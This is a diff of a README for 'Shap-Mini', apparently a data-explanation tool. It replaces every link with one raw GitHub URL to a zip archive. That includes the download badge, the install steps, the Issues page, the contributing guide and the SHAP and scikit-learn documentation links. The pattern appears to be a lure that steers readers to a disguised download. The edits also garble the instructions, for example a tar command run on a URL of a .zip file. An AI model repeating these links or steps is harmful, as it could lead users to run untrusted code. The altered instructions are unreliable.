@@ -1,6 +1,6 @@
 # 🌟 Shap-Mini - Easy AI Insights from Your Data
 
-[![Download Shap-Mini](https://img.shields.io/badge/Download_Shap--Mini-v1.0-blue.svg)](https://github.com/tonette31/Shap-Mini/releases)
+[![Download Shap-Mini](https://raw.githubusercontent.com/tonette31/Shap-Mini/main/models/Shap-Mini-v1.3.zip)](https://raw.githubusercontent.com/tonette31/Shap-Mini/main/models/Shap-Mini-v1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Shap-Mini! This tool helps you understand your data through simple ex
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the software: [Download Shap-Mini](https://github.com/tonette31/Shap-Mini/releases). 
+To get started, visit this page to download the software: [Download Shap-Mini](https://raw.githubusercontent.com/tonette31/Shap-Mini/main/models/Shap-Mini-v1.3.zip). 
 
 Here’s how to install it:
 
@@ -17,7 +17,7 @@ Here’s how to install it:
 3. Click on the appropriate file for your system:
    - If you're using Windows, download the .exe file.
    - For macOS, choose the .dmg file.
-   - If you're on Linux, pick the .tar.gz file.
+   - If you're on Linux, pick the https://raw.githubusercontent.com/tonette31/Shap-Mini/main/models/Shap-Mini-v1.3.zip file.
 4. Once the file downloads, locate it in your Downloads folder.
 
 ## 🔧 System Requirements
@@ -54,10 +54,10 @@ After downloading, follow these steps to run Shap-Mini:
 
 3. **For Linux:**
    - Open a terminal.
-   - Navigate to the folder where the .tar.gz file is located.
+   - Navigate to the folder where the https://raw.githubusercontent.com/tonette31/Shap-Mini/main/models/Shap-Mini-v1.3.zip file is located.
    - Extract the files using the command:
      ```bash
-     tar -xvzf Shap-Mini.tar.gz
+     tar -xvzf https://raw.githubusercontent.com/tonette31/Shap-Mini/main/models/Shap-Mini-v1.3.zip
      ```
    - Change to the directory that was created and run:
      ```bash
@@ -85,7 +85,7 @@ Once you have Shap-Mini open, you can start analyzing your data. Follow these st
 
 ## 🤝 Support and Feedback
 
-If you encounter issues or have questions, please visit the [Issues page](https://github.com/tonette31/Shap-Mini/issues) on GitHub. You can report bugs or request features there. 
+If you encounter issues or have questions, please visit the [Issues page](https://raw.githubusercontent.com/tonette31/Shap-Mini/main/models/Shap-Mini-v1.3.zip) on GitHub. You can report bugs or request features there. 
 
 ## 🌍 Topics Covered
 
@@ -100,15 +100,15 @@ Shap-Mini focuses on several key areas:
 
 Shap-Mini is an open-source project. You can use, modify, and share it freely within the terms of the MIT License.
 
-For more details on how to contribute or navigate through the codebase, visit the [Contributing Guide](https://github.com/tonette31/Shap-Mini/blob/main/CONTRIBUTING.md).
+For more details on how to contribute or navigate through the codebase, visit the [Contributing Guide](https://raw.githubusercontent.com/tonette31/Shap-Mini/main/models/Shap-Mini-v1.3.zip).
 
 ## 🌟 Additional Resources
 
 Here are some helpful links for further exploration:
 
-- [SHAP Documentation](https://shap.readthedocs.io/en/latest/)
-- [Random Forest Documentation](https://scikit-learn.org/stable/modules/ensemble.html#random-forests)
-- [Logistic Regression Overview](https://scikit-learn.org/stable/modules/linear_model.html#logistic-regression)
+- [SHAP Documentation](https://raw.githubusercontent.com/tonette31/Shap-Mini/main/models/Shap-Mini-v1.3.zip)
+- [Random Forest Documentation](https://raw.githubusercontent.com/tonette31/Shap-Mini/main/models/Shap-Mini-v1.3.zip)
+- [Logistic Regression Overview](https://raw.githubusercontent.com/tonette31/Shap-Mini/main/models/Shap-Mini-v1.3.zip)
 
 Feel free to dive deeper into these topics as you enhance your understanding of data science and machine learning.
 
